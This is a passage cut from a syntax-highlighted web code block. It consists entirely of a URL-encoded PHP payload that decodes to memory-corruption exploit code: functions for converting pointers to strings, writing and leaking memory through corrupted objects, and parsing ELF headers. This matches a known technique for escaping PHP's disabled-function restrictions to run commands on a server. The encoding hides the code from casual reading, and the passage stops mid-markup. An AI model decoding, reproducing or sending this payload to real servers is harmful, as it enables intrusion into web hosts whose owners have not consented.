class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">25</span>%<span class="hljs-number">63</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">26</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">25</span>%<span class="hljs-number">63</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span 